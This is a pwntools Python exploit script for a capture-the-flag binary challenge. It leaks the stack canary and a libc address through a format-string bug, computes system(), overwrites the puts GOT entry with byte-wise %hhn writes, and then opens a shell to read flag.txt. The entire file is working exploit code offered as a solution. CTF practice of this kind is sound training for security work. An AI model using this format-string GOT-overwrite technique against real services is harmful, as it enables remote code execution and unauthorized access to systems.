#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 30213
HOST = "chall.v1t.site"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x00000000004012BF
            b* 0x0000000000401309
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
puts_got = exe.got.puts

# PAYLOAD
p.sendlineafter(b'name?\n', b'/bin/sh\0')

payload = b'%25$p|%27$p'
p.sendlineafter(b'want\n', payload)
canary = int(p.recvuntil(b'|', drop=True), 16)
log.info("Canary: " + hex(canary))
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
libc.address = libc_leak - 0x2a1ca
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system

package = {
    system & 0xff: puts_got,
    system >> 8 & 0xff: puts_got + 1,
    system >> 16 & 0xff: puts_got + 2
}
order = sorted(package)
payload = f'%{order[0]}c%16$hhn'.encode()
payload += f'%{order[1] - order[0]}c%17$hhn'.encode()
payload += f'%{order[2] - order[1]}c%18$hhn'.encode()
payload = payload.ljust(0x40, b'\0')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]]
    )
p.sendlineafter(b'LOUD!\n', payload)

p.sendline(b'cat flag.txt')

p.interactive()